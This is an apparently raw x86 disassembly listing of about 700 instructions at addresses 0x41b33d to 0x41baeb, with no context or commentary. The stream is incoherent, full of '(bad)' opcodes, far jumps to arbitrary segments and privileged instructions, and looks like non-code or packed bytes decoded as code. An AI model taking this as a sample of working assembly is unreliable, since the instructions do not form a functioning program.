  41b33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b33e:	add    DWORD PTR [ebx-0x67],edx
  41b341:	pop    edi
  41b342:	mov    ch,0xc7
  41b344:	repnz (bad) 
  41b347:	ja     0x41b2e1
  41b349:	add    eax,0xc8bd4c53
  41b34e:	dec    esi
  41b34f:	mov    eax,0x8e0bafae
  41b354:	call   0x4d4f:0xe420c93e
  41b35b:	sbb    ebp,esi
  41b35d:	into   
  41b35e:	dec    edi
  41b35f:	daa    
  41b360:	rcr    DWORD PTR [ebx],cl
  41b362:	mov    BYTE PTR [esi-0x56],ah
  41b365:	mov    eax,0x16bed549
  41b36a:	or     BYTE PTR [ecx+0x44],dl
  41b36d:	test   DWORD PTR [eax+0x2ef1070e],esp
  41b373:	xor    al,0xaf
  41b375:	add    BYTE PTR [esp+ebp*4-0x42],bl
  41b379:	popa   
  41b37a:	stos   DWORD PTR es:[edi],eax
  41b37b:	rcl    BYTE PTR [ebx+0x33d0d833],1
  41b381:	fcom   DWORD PTR [ecx]
  41b383:	ret    0xbbea
  41b386:	sti    
  41b387:	jg     0x41b32b
  41b389:	push   ss
  41b38a:	jl     0x41b31a
  41b38c:	xchg   ebx,eax
  41b38d:	dec    esp
  41b38e:	les    edx,FWORD PTR ds:0x6fab1f39
  41b394:	add    esi,DWORD PTR ds:0x845a9a0e
  41b39a:	mov    eax,0x5c933bd7
  41b39f:	mov    ebp,0x369c597b
  41b3a4:	xchg   DWORD PTR [ebx],esp
  41b3a6:	mov    eax,ds:0xd627c8a0
  41b3ab:	jmp    0xf08a:0x84a91cda
  41b3b2:	stos   BYTE PTR es:[edi],al
  41b3b3:	es mov ecx,edi
  41b3b6:	add    DWORD PTR ds:0x232bd391,esp
  41b3bc:	aad    0x97
  41b3be:	pop    es
  41b3bf:	pop    esi
  41b3c0:	and    dl,0x69
  41b3c3:	lahf   
  41b3c4:	xor    DWORD PTR [eax-0x1ddb5052],esp
  41b3ca:	bound  esp,QWORD PTR [edx-0x6]
  41b3cd:	or     eax,0x276e76a1
  41b3d2:	mov    dl,0x78
  41b3d4:	imul   eax,esi,0xf45781d
  41b3da:	jae    0x41b442
  41b3dc:	sub    DWORD PTR [ebp-0x62f312ed],ebp
  41b3e2:	push   ds
  41b3e3:	inc    edx
  41b3e4:	sub    ebp,DWORD PTR [eax+0x139b50f3]
  41b3ea:	es mov ebx,0x4f58213b
  41b3f0:	daa    
  41b3f1:	and    eax,0x171cb5bc
  41b3f6:	ins    BYTE PTR es:[edi],dx
  41b3f7:	or     BYTE PTR [ebp+eax*8+0x67d39723],ch
  41b3fe:	sub    eax,0x9aae23f0
  41b403:	ins    DWORD PTR es:[edi],dx
  41b404:	xor    DWORD PTR [esi-0x60],esp
  41b407:	call   0xdb43:0xe276c90c
  41b40e:	loop   0x41b40b
  41b410:	fmulp  st(0),st
  41b412:	jge    0x41b469
  41b414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b415:	sahf   
  41b416:	mov    edi,0xd1686394
  41b41b:	push   ss
  41b41c:	(bad)  
  41b41d:	ds xchg ebx,eax
  41b41f:	mov    ebp,0x2ae6484a
  41b424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b425:	inc    edx
  41b426:	icebp  
  41b427:	das    
  41b428:	cwde   
  41b429:	sub    ch,BYTE PTR [esi-0x2e30c2c5]
  41b42f:	bound  edi,QWORD PTR [eiz*1-0x13f4d5c3]
  41b436:	or     al,0x21
  41b438:	test   BYTE PTR [eax-0x3e],0xfa
  41b43c:	popa   
  41b43d:	sbb    BYTE PTR [edx+0x18],ch
  41b440:	add    DWORD PTR [ebp-0x58],0x25
  41b444:	jno    0x41b47a
  41b446:	(bad)  
  41b447:	fist   WORD PTR [esi+0x1f]
  41b44a:	dec    eax
  41b44b:	mov    esi,0xcf456e87
  41b450:	(bad)  
  41b451:	rcr    bl,1
  41b453:	jge    0x41b3f3
  41b455:	add    eax,0x8bd3944a
  41b45a:	rcl    ecx,0x3
  41b45d:	xlat   BYTE PTR ds:[ebx]
  41b45e:	in     eax,0xdb
  41b460:	jns    0x41b4af
  41b462:	xchg   ebp,eax
  41b463:	into   
  41b464:	idiv   ah
  41b466:	and    edx,DWORD PTR [ebx+0x5b]
  41b469:	cld    
  41b46a:	fsub   QWORD PTR [eax-0x4b24fba7]
  41b470:	jecxz  0x41b48f
  41b472:	out    0x0,al
  41b474:	and    bl,BYTE PTR [edi]
  41b476:	fild   WORD PTR [eax+0x4e7adfb7]
  41b47c:	nop
  41b47d:	in     eax,dx
  41b47e:	rcr    edi,1
  41b480:	rcl    BYTE PTR [edi-0x78c051dd],0x7
  41b487:	(bad)  
  41b488:	in     al,0x2f
  41b48a:	in     eax,dx
  41b48b:	bound  esi,QWORD PTR [ebx]
  41b48d:	mov    dh,0x82
  41b48f:	test   eax,0x25eb5cf1
  41b494:	adc    eax,DWORD PTR [ecx-0x2c97db1e]
  41b49a:	pop    DWORD PTR [ebp-0x783a8d5a]
  41b4a0:	mov    ebp,0x933a6bc0
  41b4a5:	cli    
  41b4a6:	icebp  
  41b4a7:	dec    edx
  41b4a8:	mov    cl,0xd8
  41b4aa:	fsub   QWORD PTR [edx+0x1610ba4d]
  41b4b0:	je     0x41b4dd
  41b4b2:	pop    ebx
  41b4b3:	cli    
  41b4b4:	mov    DWORD PTR [esi+0x7c],esi
  41b4b7:	cwde   
  41b4b8:	and    DWORD PTR ds:0x82f1eade,ecx
  41b4be:	add    DWORD PTR [eax-0x1e],esi
  41b4c1:	cmp    edx,DWORD PTR [eax+0x7fbed412]
  41b4c7:	fst    QWORD PTR [edx-0xd13c332]
  41b4cd:	sbb    eax,0x36afdae0
  41b4d2:	xchg   esi,eax
  41b4d3:	jle    0x41b458
  41b4d5:	xor    eax,0x14959588
  41b4da:	add    esp,eax
  41b4dc:	mov    ecx,0x5d31231f
  41b4e1:	mov    ebx,0x4e567644
  41b4e6:	sub    BYTE PTR [eax],dh
  41b4e8:	jp     0x41b552
  41b4ea:	push   edx
  41b4eb:	outs   dx,DWORD PTR ds:[esi]
  41b4ec:	and    ecx,ecx
  41b4ee:	inc    esi
  41b4ef:	sub    BYTE PTR [edi+0x447cbfb9],al
  41b4f5:	mov    ecx,0x408bb65e
  41b4fa:	ja     0x41b54c
  41b4fc:	jmp    0xf084cf02
  41b501:	and    al,0xbf
  41b503:	mov    al,0xe8
  41b505:	fimul  DWORD PTR [eax+edx*4+0x75d7b88d]
  41b50c:	mov    cl,0x7c
  41b50e:	loop   0x41b4e2
  41b510:	or     ecx,DWORD PTR [edx-0x68]
  41b513:	les    edx,FWORD PTR [ecx+0x3fab43da]
  41b519:	lods   al,BYTE PTR ds:[esi]
  41b51a:	xor    dl,cl
  41b51c:	cmp    eax,0xac880ed6
  41b521:	jns    0x41b4af
  41b523:	scas   al,BYTE PTR es:[edi]
  41b524:	pusha  
  41b525:	pop    ecx
  41b526:	(bad)  
  41b527:	sar    edx,1
  41b529:	mov    bh,0x3f
  41b52b:	imul   ebp,DWORD PTR [esi+0x50],0x45b7adcc
  41b532:	cmp    ah,dh
  41b534:	mov    ch,0xc8
  41b536:	push   eax
  41b537:	mov    ch,0x8e
  41b539:	inc    ebx
  41b53a:	(bad)  
  41b53b:	sub    DWORD PTR [ecx-0x24],ebp
  41b53e:	cli    
  41b53f:	mov    al,0x38
  41b541:	ds jge 0x41b5b8
  41b544:	jne    0x41b54e
  41b546:	fwait
  41b547:	mov    ah,0x9
  41b549:	mov    al,ds:0x3bf71df1
  41b54e:	ds add edx,esi
  41b551:	cs pop esp
  41b553:	lock icebp 
  41b555:	pusha  
  41b556:	xchg   esi,eax
  41b557:	jb     0x41b509
  41b559:	push   ecx
  41b55a:	mov    dh,0x60
  41b55c:	sub    BYTE PTR [ebp-0x57],cl
  41b55f:	test   ch,0x93
  41b562:	jp     0x41b56a
  41b564:	and    eax,DWORD PTR [edx+0x70]
  41b567:	mov    bl,0xc7
  41b569:	in     eax,0x8e
  41b56b:	adc    dh,cl
  41b56d:	mov    ebp,0x5a5f1173
  41b572:	pop    ebp
  41b573:	inc    esi
  41b574:	js     0x41b5f2
  41b576:	fist   DWORD PTR ds:[esi]
  41b579:	jmp    0xf967:0x7c6a0b92
  41b580:	mov    ah,0xa3
  41b582:	cmp    al,0x4a
  41b585:	sbb    eax,DWORD PTR [eax+0x1e]
  41b588:	push   edi
  41b589:	(bad)  
  41b58a:	jnp    0x41b575
  41b58c:	xchg   DWORD PTR [ecx-0x79],ebx
  41b58f:	mov    ch,0xf7
  41b591:	cmp    ch,BYTE PTR [esp+ecx*4+0x51]
  41b595:	jp     0x41b56c
  41b597:	push   cs
  41b598:	fcmovnu st,st(4)
  41b59a:	pop    ss
  41b59b:	in     al,0x79
  41b59d:	inc    edi
  41b59e:	call   0xf44e2c1
  41b5a3:	cmp    al,0x65
  41b5a5:	dec    edi
  41b5a6:	or     DWORD PTR [esi],edx
  41b5a8:	or     esi,esi
  41b5aa:	test   eax,0x91659003
  41b5af:	or     al,0xc2
  41b5b1:	pop    edi
  41b5b2:	cmp    BYTE PTR [edi+ecx*4-0x6af1e2ae],dh
  41b5b9:	sbb    al,0xd
  41b5bb:	inc    eax
  41b5bc:	push   ebx
  41b5bd:	out    dx,al
  41b5be:	sar    BYTE PTR [edx-0x237b750b],0xe0
  41b5c5:	sub    bh,BYTE PTR [edi]
  41b5c7:	push   0xffffffbb
  41b5c9:	adc    ebp,DWORD PTR [esi]
  41b5cb:	lods   al,BYTE PTR fs:[esi]
  41b5cd:	test   BYTE PTR [ecx-0x1c],ch
  41b5d0:	sbb    eax,0xb885ec82
  41b5d5:	ficomp DWORD PTR [esi+0x31]
  41b5d8:	dec    esp
  41b5d9:	xchg   ebp,eax
  41b5da:	and    al,dl
  41b5dc:	xor    dh,BYTE PTR [ecx]
  41b5de:	mov    bh,0x3
  41b5e0:	mov    esi,0x4472fb52
  41b5e5:	push   DWORD PTR ds:0x3d300f3f
  41b5eb:	push   eax
  41b5ec:	stc    
  41b5ed:	mov    dl,0xff
  41b5ef:	fwait
  41b5f0:	dec    edx
  41b5f1:	je     0x41b57f
  41b5f3:	fild   DWORD PTR [edi]
  41b5f5:	test   dl,dl
  41b5f7:	pop    eax
  41b5f8:	imul   ebx,DWORD PTR [esi],0x6303cf0d
  41b5fe:	push   ebp
  41b5ff:	out    0x92,al
  41b601:	inc    edx
  41b602:	call   DWORD PTR [edx-0x64]
  41b605:	mov    eax,ds:0x1f829bc6
  41b60a:	jle    0x41b671
  41b60c:	jecxz  0x41b67d
  41b60e:	int    0xe3
  41b610:	jb     0x41b623
  41b612:	out    0xd6,al
  41b614:	push   esp
  41b615:	iret   
  41b616:	jecxz  0x41b63a
  41b618:	in     al,0x5d
  41b61a:	ds inc ebp
  41b61c:	mov    bl,BYTE PTR [ebp-0x4d]
  41b61f:	mov    edi,0x321eec31
  41b624:	fstp   QWORD PTR [esi*4-0x5aaeb421]
  41b62b:	fidivr WORD PTR [eax+0x74b36537]
  41b631:	and    al,BYTE PTR [ecx+0x7d]
  41b634:	xor    BYTE PTR [ebx+0x4d87023f],al
  41b63a:	push   es
  41b63b:	mov    cl,0xa2
  41b63d:	and    BYTE PTR [esi],ch
  41b63f:	xchg   ebp,eax
  41b640:	xchg   DWORD PTR [esi+esi*8+0x6],esi
  41b644:	cs (bad) 
  41b647:	aad    0x67
  41b649:	xchg   DWORD PTR [edx+0x45],edi
  41b64c:	imul   ch
  41b64e:	(bad)  
  41b650:	les    ebx,FWORD PTR [ecx]
  41b652:	jo     0x41b60f
  41b654:	dec    eax
  41b655:	aam    0xdc
  41b657:	sbb    eax,0xa525712e
  41b65c:	inc    edx
  41b65d:	push   ebp
  41b65e:	mov    DWORD PTR [edx+0x7b],ebx
  41b661:	imul   esp,DWORD PTR [ebx+0x38146d24],0xffffff91
  41b668:	test   DWORD PTR [ebp+0x55],eax
  41b66b:	out    dx,al
  41b66c:	imul   dl
  41b66e:	pop    ds
  41b66f:	fstp   QWORD PTR [ecx+eiz*4-0x43841844]
  41b676:	mov    edx,0xcc25bb72
  41b67b:	pop    ss
  41b67c:	cmp    DWORD PTR [eax],ebx
  41b67e:	fs test ebp,ebp
  41b681:	adc    edi,esp
  41b683:	sbb    eax,0x39db5769
  41b688:	jge    0x41b69b
  41b68a:	mov    WORD PTR [ebx],?
  41b68c:	out    0x8d,eax
  41b68e:	in     al,dx
  41b68f:	mov    ecx,0x5c45fb31
  41b694:	retf   
  41b695:	stc    
  41b696:	addr16 leave 
  41b698:	adc    ebp,DWORD PTR [edx+0x5918dd0f]
  41b69e:	sub    al,0xf
  41b6a0:	adc    edi,DWORD PTR [eax-0x6cdd79e0]
  41b6a6:	dec    edx
  41b6a7:	pushf  
  41b6a8:	sub    al,0x74
  41b6aa:	inc    edx
  41b6ab:	pushf  
  41b6ac:	mov    bh,0x7
  41b6ae:	pop    ds
  41b6af:	jp     0x41b677
  41b6b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6b2:	inc    ebp
  41b6b3:	mov    ds:0x78b723f4,al
  41b6b8:	adc    DWORD PTR [ebp+0x33df248d],0xce2e439f
  41b6c2:	cdq    
  41b6c3:	and    eax,0xc994d854
  41b6c8:	pop    edx
  41b6c9:	mov    dh,0x39
  41b6cb:	daa    
  41b6cc:	cwde   
  41b6cd:	push   esp
  41b6ce:	out    dx,al
  41b6cf:	adc    edi,ebx
  41b6d1:	push   0xffffffe5
  41b6d3:	in     eax,0x60
  41b6d5:	add    eax,0x67ab1eaf
  41b6da:	sub    al,0x33
  41b6dc:	in     eax,dx
  41b6dd:	mov    ebx,0x934b8dcd
  41b6e2:	in     al,0xe6
  41b6e4:	ret    
  41b6e5:	cmp    DWORD PTR [edi+0x16a05dd6],0x1d
  41b6ec:	cs loop 0x41b678
  41b6ef:	push   eax
  41b6f0:	cmp    esp,DWORD PTR [esp+eiz*2]
  41b6f3:	fimul  WORD PTR [eax+0x64]
  41b6f6:	das    
  41b6f7:	dec    edi
  41b6f8:	cdq    
  41b6f9:	cwd    
  41b6fb:	sub    al,0x8f
  41b6fd:	push   edi
  41b6fe:	ret    0x7aae
  41b701:	or     al,0x85
  41b703:	xor    eax,0x13f196c9
  41b708:	gs ja  0x41b788
  41b70b:	call   0xf1fa:0x6b4a3ec3
  41b712:	imul   edx,ebx,0x40872eca
  41b718:	scas   eax,DWORD PTR es:[edi]
  41b719:	rcl    BYTE PTR [ecx],cl
  41b71b:	push   es
  41b71c:	xchg   ecx,eax
  41b71d:	rol    BYTE PTR [eax-0x46408f39],1
  41b723:	and    DWORD PTR [edx+0xa],0x73
  41b727:	push   edx
  41b728:	rcr    DWORD PTR [ebx+0x59],0x54
  41b72c:	mov    ds:0x7082a37f,al
  41b731:	mov    ch,0x40
  41b733:	inc    esi
  41b734:	pop    eax
  41b735:	aaa    
  41b736:	sti    
  41b737:	shl    DWORD PTR [edi-0x3d],cl
  41b73a:	xor    al,0x26
  41b73c:	jecxz  0x41b71b
  41b73e:	dec    esi
  41b73f:	jns    0x41b74d
  41b741:	adc    al,0x4b
  41b743:	push   edx
  41b744:	pop    es
  41b745:	pusha  
  41b746:	adc    esp,DWORD PTR [ebp-0x5c5559]
  41b74c:	addr16 jo 0x41b6db
  41b74f:	int3   
  41b750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b751:	push   ebx
  41b752:	cwde   
  41b753:	pop    ds
  41b754:	or     esp,DWORD PTR [ecx-0x327ee9fa]
  41b75a:	push   ss
  41b75b:	(bad)  
  41b75c:	push   0x36d3ee69
  41b761:	js     0x41b73d
  41b763:	retf   
  41b764:	stos   BYTE PTR es:[edi],al
  41b765:	mov    ecx,0xb5ef874c
  41b76a:	(bad)  
  41b76b:	(bad)  
  41b76c:	sub    BYTE PTR [ecx+0x45],bl
  41b76f:	jno    0x41b7ad
  41b771:	inc    esi
  41b772:	jnp    0x41b705
  41b774:	pop    ecx
  41b775:	pop    esi
  41b776:	mov    ds:0x902c95a4,al
  41b77b:	test   DWORD PTR [edi-0x70],0x5e5c0086
  41b782:	mov    ecx,0xb5d8268d
  41b787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b789:	inc    ebx
  41b78a:	jo     0x41b7a4
  41b78c:	loop   0x41b74f
  41b78e:	adc    DWORD PTR [esp+esi*4],0xc4964b08
  41b795:	loop   0x41b804
  41b797:	pop    eax
  41b798:	not    BYTE PTR [ebp+0x0]
  41b79b:	lods   eax,DWORD PTR ds:[esi]
  41b79c:	mov    ch,0xd7
  41b79e:	daa    
  41b79f:	fcmovnb st,st(7)
  41b7a1:	add    al,al
  41b7a3:	adc    ecx,DWORD PTR [ebx+0x3e4c53fb]
  41b7a9:	jbe    0x41b81c
  41b7ab:	int    0x95
  41b7ad:	retf   
  41b7ae:	or     eax,DWORD PTR [esi-0x410babaa]
  41b7b4:	leave  
  41b7b5:	xchg   bp,ax
  41b7b7:	setbe  bl
  41b7ba:	div    DWORD PTR [ebp+0x410d3256]
  41b7c0:	loopne 0x41b767
  41b7c2:	aaa    
  41b7c3:	ins    DWORD PTR es:[edi],dx
  41b7c4:	dec    ebp
  41b7c5:	add    eax,0x6dacad9e
  41b7ca:	hlt    
  41b7cb:	rcr    BYTE PTR ds:0x2feb5882,0x38
  41b7d2:	push   0x41
  41b7d4:	mov    bh,0x6
  41b7d6:	aaa    
  41b7d7:	add    bl,BYTE PTR [edx-0x46dc70bc]
  41b7dd:	and    dl,BYTE PTR [ebp+0x1f]
  41b7e0:	data16 jae 0x41b82f
  41b7e3:	paddsw mm3,QWORD PTR [esi-0x32]
  41b7e7:	loop   0x41b7e3
  41b7e9:	mov    BYTE PTR [edx-0x39b7f44b],al
  41b7ef:	sbb    DWORD PTR [ebx-0x1],edi
  41b7f2:	sub    DWORD PTR [ecx-0x3e],0xbfb9c051
  41b7f9:	pop    edx
  41b7fa:	push   ss
  41b7fb:	lock ds dec esi
  41b7fe:	pop    esi
  41b7ff:	cmp    ebp,edx
  41b801:	call   0xfce0:0x8a0a79a7
  41b808:	pop    ebx
  41b809:	cld    
  41b80a:	mov    edx,0xee2d7c32
  41b80f:	test   DWORD PTR cs:0x7c86a739,0x2cec1bb3
  41b81a:	sar    DWORD PTR [edi+0x9],1
  41b81d:	retf   0x57db
  41b820:	xchg   ebx,eax
  41b821:	jne    0x41b890
  41b823:	jmp    0x37f:0xa472925b
  41b82a:	jns    0x41b830
  41b82c:	add    ebx,DWORD PTR [ebp-0x3b35cebe]
  41b832:	and    eax,0xd9ff16a6
  41b837:	shl    BYTE PTR [ebp+0x2090aa51],0xe9
  41b83e:	mov    ecx,0x2c09a84e
  41b843:	mov    dl,0x17
  41b845:	(bad)  
  41b846:	fldcw  WORD PTR [ebp-0x719ee3d8]
  41b84c:	or     esi,DWORD PTR [eax+ebp*1]
  41b84f:	mov    esi,0xf3dccaf0
  41b854:	aas    
  41b855:	pop    edx
  41b856:	(bad)  
  41b857:	hlt    
  41b858:	lods   eax,DWORD PTR ds:[esi]
  41b859:	std    
  41b85a:	cmp    eax,0x86b2afc6
  41b85f:	stos   DWORD PTR es:[edi],eax
  41b860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b861:	cmp    ebx,DWORD PTR [eax+esi*1+0x2c]
  41b865:	iret   
  41b866:	sub    ebx,DWORD PTR [eax+0x51]
  41b869:	push   esp
  41b86a:	sub    ebx,DWORD PTR ds:0xc323f5b3
  41b870:	ins    BYTE PTR es:[edi],dx
  41b871:	rcr    BYTE PTR [edx-0x61408cc],1
  41b877:	mov    edx,0x5e868738
  41b87c:	call   0x9e535045
  41b881:	pop    edi
  41b882:	scas   al,BYTE PTR es:[edi]
  41b883:	pop    edi
  41b884:	xchg   ebp,eax
  41b885:	and    ah,BYTE PTR [eax+0x30c2ab7c]
  41b88b:	scas   al,BYTE PTR es:[edi]
  41b88c:	aas    
  41b88d:	mov    ebx,0x13c5fbc6
  41b892:	adc    ecx,DWORD PTR [ebp+0x2c]
  41b895:	aam    0x43
  41b897:	jle    0x41b8e7
  41b899:	call   0x81e4e9d2
  41b89e:	inc    esi
  41b89f:	pop    edx
  41b8a0:	inc    ebp
  41b8a1:	mov    DWORD PTR [esi],edi
  41b8a3:	mov    al,0x82
  41b8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a6:	pop    esp
  41b8a7:	cmp    DWORD PTR [ebp-0x598b9a16],ebp
  41b8ad:	iret   
  41b8ae:	pop    ecx
  41b8af:	pop    ebp
  41b8b0:	cmc    
  41b8b1:	fcomp  QWORD PTR [eax-0x48]
  41b8b4:	test   DWORD PTR [edi],0x9b9efe86
  41b8ba:	(bad)  
  41b8bb:	mov    bl,0xa1
  41b8bd:	scas   eax,DWORD PTR es:[edi]
  41b8be:	data16 int 0x51
  41b8c1:	and    edi,DWORD PTR [esi+eax*2+0x27]
  41b8c5:	nop
  41b8c6:	sti    
  41b8c7:	stc    
  41b8c8:	jg     0x41b947
  41b8ca:	in     al,0xcc
  41b8cc:	and    al,0x11
  41b8ce:	div    DWORD PTR [eax-0x77d6124b]
  41b8d4:	test   eax,0xcbba7122
  41b8d9:	nop
  41b8da:	pop    edi
  41b8db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8dc:	xchg   edi,eax
  41b8dd:	jno    0x41b938
  41b8df:	dec    ebp
  41b8e0:	and    al,0x46
  41b8e2:	mov    ebp,0x85f85450
  41b8e7:	add    eax,0x41471e61
  41b8ec:	pop    ds
  41b8ed:	loopne 0x41b8d6
  41b8ef:	in     eax,0x3c
  41b8f1:	test   DWORD PTR [edx-0xf88977c],edx
  41b8f7:	les    ebx,FWORD PTR [edx]
  41b8f9:	lock mov bh,BYTE PTR [edi]
  41b8fc:	xor    al,0x93
  41b8fe:	xchg   edi,eax
  41b8ff:	pop    esp
  41b900:	pop    ebp
  41b901:	sub    ebx,ecx
  41b903:	push   edx
  41b904:	sbb    dh,BYTE PTR [ecx]
  41b906:	neg    DWORD PTR [ecx+0x12]
  41b909:	outs   dx,DWORD PTR ds:[esi]
  41b90a:	cmp    BYTE PTR ds:0x1dfa03a0,cl
  41b910:	xor    ah,BYTE PTR [esi-0x2b]
  41b913:	mov    dl,0x71
  41b915:	mov    eax,ds:0x70c3b086
  41b91a:	arpl   WORD PTR [edi],bx
  41b91c:	mov    esp,0x15c01cb8
  41b921:	sahf   
  41b922:	aam    0x1
  41b924:	iret   
  41b925:	jno    0x41b8fb
  41b927:	pop    ds
  41b928:	shl    ch,1
  41b92a:	arpl   WORD PTR [esi+0xf59472],bx
  41b930:	retf   
  41b931:	or     al,0x22
  41b933:	sub    eax,DWORD PTR [ecx]
  41b935:	xlat   BYTE PTR ds:[ebx]
  41b936:	(bad)  
  41b937:	mov    ebp,0x2e9cdf8f
  41b93c:	test   eax,0x40e56759
  41b941:	xchg   ebx,eax
  41b942:	and    dh,0x7e
  41b945:	add    ebp,DWORD PTR [eax-0x3c]
  41b948:	imul   edi,ebx,0xffffffe6
  41b94b:	and    DWORD PTR [esi+ecx*2+0x5e],esp
  41b94f:	xchg   ecx,eax
  41b950:	cmp    al,0x2c
  41b952:	or     BYTE PTR [edi+0x75b45146],ch
  41b958:	inc    eax
  41b959:	sbb    eax,DWORD PTR [ebp-0x40a73282]
  41b95f:	sbb    eax,0xa3af2836
  41b964:	test   DWORD PTR [edx+0x246bf244],esp
  41b96a:	in     al,dx
  41b96b:	dec    edx
  41b96c:	fcomip st,st(1)
  41b96e:	out    0x4e,eax
  41b970:	and    al,0x58
  41b972:	ins    BYTE PTR es:[edi],dx
  41b973:	or     DWORD PTR [ebx-0x20],ecx
  41b976:	out    0x78,al
  41b978:	call   0x8b51:0x9fcf31f
  41b97f:	cmp    ecx,DWORD PTR [ecx]
  41b981:	sbb    BYTE PTR [bx+di-0x305d],0x69
  41b987:	ret    
  41b988:	mov    BYTE PTR [ebp-0x458040db],cl
  41b98e:	cmp    BYTE PTR [ebp-0x76c5e727],cl
  41b994:	xor    al,0xa7
  41b996:	push   cs
  41b997:	rcr    BYTE PTR [edi-0x1b],1
  41b99a:	bound  ecx,QWORD PTR [ecx]
  41b99c:	dec    bp
  41b99e:	shr    edx,0x92
  41b9a1:	sbb    eax,0x867bf04e
  41b9a6:	sbb    BYTE PTR [ebp+0x25],dl
  41b9a9:	data16 rcl dl,1
  41b9ac:	mov    WORD PTR [ecx],fs
  41b9ae:	lock gs adc al,0x3c
  41b9b2:	data16 loop 0x41b944
  41b9b5:	lods   eax,DWORD PTR ds:[esi]
  41b9b6:	addr16 hlt 
  41b9b8:	mov    bl,0xd7
  41b9ba:	fistp  QWORD PTR [edx+0x73c4d12a]
  41b9c0:	into   
  41b9c1:	mov    esi,0x1859e41a
  41b9c6:	add    al,0xb7
  41b9c8:	xor    BYTE PTR [ebp-0x45],al
  41b9cb:	fistp  WORD PTR [ebp-0x4cf2191a]
  41b9d1:	rcr    BYTE PTR [edi-0x2bd78701],0x6d
  41b9d8:	inc    ebx
  41b9d9:	daa    
  41b9da:	in     eax,0xca
  41b9dc:	xchg   ecx,eax
  41b9dd:	int3   
  41b9de:	and    al,0xd6
  41b9e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9e1:	sbb    al,BYTE PTR [ecx]
  41b9e3:	retf   0xdc72
  41b9e6:	stos   BYTE PTR es:[edi],al
  41b9e7:	mov    WORD PTR [edx+0x51],ds
  41b9ea:	cwde   
  41b9eb:	data16 jp 0x41b9c0
  41b9ee:	jle    0x41ba64
  41b9f0:	cmp    BYTE PTR ds:0x77c98462,dh
  41b9f6:	push   ss
  41b9f7:	push   ebp
  41b9f8:	(bad)  
  41b9fa:	icebp  
  41b9fb:	fmul   st,st(3)
  41b9fd:	aas    
  41b9fe:	sub    BYTE PTR [esi+0x13ba4e32],ah
  41ba04:	inc    ebx
  41ba05:	xchg   esi,eax
  41ba06:	xchg   ebx,eax
  41ba07:	es loopne 0x41ba84
  41ba0a:	mov    bh,0x13
  41ba0c:	pop    es
  41ba0d:	(bad)  
  41ba0e:	jmp    0x41b9f1
  41ba10:	dec    esp
  41ba11:	clc    
  41ba12:	jp     0x41b9c0
  41ba14:	cdq    
  41ba15:	add    eax,0x3ecfe003
  41ba1a:	jne    0x41ba7c
  41ba1c:	mov    ds:0xaae6ad32,eax
  41ba21:	jl     0x41ba76
  41ba23:	push   cs
  41ba24:	sub    ecx,esp
  41ba26:	cdq    
  41ba27:	xlat   BYTE PTR ds:[ebx]
  41ba28:	jle    0x41ba2f
  41ba2a:	div    BYTE PTR [esp+ebx*2]
  41ba2d:	push   cs
  41ba2e:	and    al,0x9f
  41ba30:	loopne 0x41baa4
  41ba32:	test   cl,dl
  41ba34:	out    0xa9,al
  41ba36:	xor    BYTE PTR [ebx+0x4c],bh
  41ba39:	ficom  DWORD PTR [ecx+0x2]
  41ba3c:	sar    BYTE PTR [edx],cl
  41ba3e:	xchg   edx,eax
  41ba3f:	cmp    eax,0xaf699cdd
  41ba44:	mov    ah,0x1c
  41ba46:	jmp    DWORD PTR [edi+0x67]
  41ba49:	js     0x41ba6d
  41ba4b:	cmp    BYTE PTR [edx-0x2459b7e9],bl
  41ba51:	jecxz  0x41bacc
  41ba53:	add    eax,0xdac27699
  41ba58:	push   ds
  41ba59:	pop    eax
  41ba5a:	pop    edx
  41ba5b:	pusha  
  41ba5c:	pop    edx
  41ba5d:	jb     0x41ba51
  41ba5f:	jg     0x41ba29
  41ba61:	cmp    eax,0x71acc188
  41ba66:	(bad)  
  41ba67:	outs   dx,BYTE PTR ds:[esi]
  41ba68:	sbb    dl,dl
  41ba6a:	lods   al,BYTE PTR ds:[esi]
  41ba6b:	push   ebp
  41ba6c:	or     DWORD PTR [esi-0x1954f8f3],ebx
  41ba72:	sub    BYTE PTR [edi-0x4f614a8f],cl
  41ba78:	fnsave [edx+0x6b]
  41ba7b:	jnp    0x41ba19
  41ba7d:	loop   0x41bafd
  41ba7f:	mov    ds:0x5851d689,al
  41ba84:	push   edx
  41ba85:	xor    dh,BYTE PTR [ecx+0x554670da]
  41ba8b:	mov    edi,0xffa6b789
  41ba90:	sbb    eax,0x5385fe90
  41ba95:	(bad)  
  41ba96:	mov    esp,0xd4f7c059
  41ba9b:	pop    ecx
  41ba9c:	lods   al,BYTE PTR ds:[esi]
  41ba9d:	imul   esi,DWORD PTR [ebx],0xe5c3cdec
  41baa3:	mov    dh,BYTE PTR ds:0x80bc08e2
  41baa9:	jmp    0x23cff17f
  41baae:	ins    BYTE PTR es:[edi],dx
  41baaf:	pop    esp
  41bab0:	jmp    0x41bb0a
  41bab2:	pop    ds
  41bab3:	loop   0x41ba5c
  41bab5:	in     al,dx
  41bab6:	ins    BYTE PTR es:[edi],dx
  41bab7:	push   0xffffffe2
  41bab9:	sbb    BYTE PTR [ebx+0x56a4dfe4],0xe8
  41bac0:	lods   eax,DWORD PTR ss:[esi]
  41bac2:	xor    al,BYTE PTR [ecx]
  41bac4:	cmp    al,0xb4
  41bac6:	les    ebp,FWORD PTR [edi]
  41bac8:	clc    
  41bac9:	jg     0x41bac9
  41bacb:	or     ch,0x58
  41bace:	cmp    al,BYTE PTR [ecx]
  41bad0:	aad    0xd5
  41bad2:	scas   eax,DWORD PTR es:[edi]
  41bad3:	push   0x7ad12b6b
  41bad8:	cmp    esi,ecx
  41bada:	push   0x38
  41badc:	or     al,0x71
  41bade:	adc    al,0x9f
  41bae0:	push   ds
  41bae1:	xchg   ecx,eax
  41bae2:	mov    al,0x9c
  41bae4:	pop    ebp
  41bae5:	fcomp  QWORD PTR [ebp+0x61a7be3a]
  41baeb:	lahf   
